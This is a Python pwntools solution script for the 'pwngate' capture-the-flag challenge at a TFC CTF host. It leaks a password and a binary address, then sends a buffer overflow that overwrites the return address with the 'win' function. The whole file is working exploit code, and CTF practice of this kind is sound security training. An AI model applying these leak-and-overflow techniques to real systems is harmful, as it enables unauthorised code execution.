#!/usr/bin/env python3

from pwn import *

exe = ELF("./pwngate")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe
#context.terminal = ['tmux', 'splitw', '-h']


def conn():
    if args.REMOTE:
        io = remote("challs.tfcctf.com", 31704)
    else:
        if args.GDB:
            io = gdb.debug([exe.path], aslr=False, gdbscript="""
                  break *00401a6b  
               """) #set follow-fork-mode

        else:
            io = process([exe.path])
            #gdb.attach(io)
    return io


def main():
    io = conn()
    io.sendlineafter(b"name:", b"poni")
    io.sendlineafter(b"choice: ", b"1")
    io.sendlineafter(b"leap: ", b"\xec" * 9)


    io.sendlineafter(b"choice: ", b"2")
    io.sendlineafter(b"what to do: ", str(0x1_00_00_00_00))
    io.recvuntil(b" Your password is: \n")
    password = io.recvline().strip()

    io.sendlineafter(b"choice: ", b"3")
    io.sendlineafter(b"Choose: ", b"3")
    io.sendlineafter(b"Choose: ", b"2")
    io.recvuntil("your answers: \n")
    # 15688
    print("leak : ",hex(u64(io.recv(6).ljust(8,b'\x00'))-15688))
    exe.address = u64(io.recv(6).ljust(8, b'\x00')) - 15688
    io.sendlineafter(b"Choose: ", b"1")
    io.sendlineafter(b"?", b"")
    io.sendlineafter(b"?", b"")
    io.sendlineafter(b"?", b"")
    io.sendlineafter(b"?", b"")
    io.sendlineafter(b"Choose: ", b"4")

    io.sendlineafter(b"choice: ", b"4")
    io.sendlineafter(b"password?", password)
    io.sendlineafter(b"?: ", b"A" * (0x20-8) + p64(exe.symbols['win']))

    io.sendlineafter(b"choice: ", b"2")
    io.interactive()


if __name__ == "__main__":
    main()
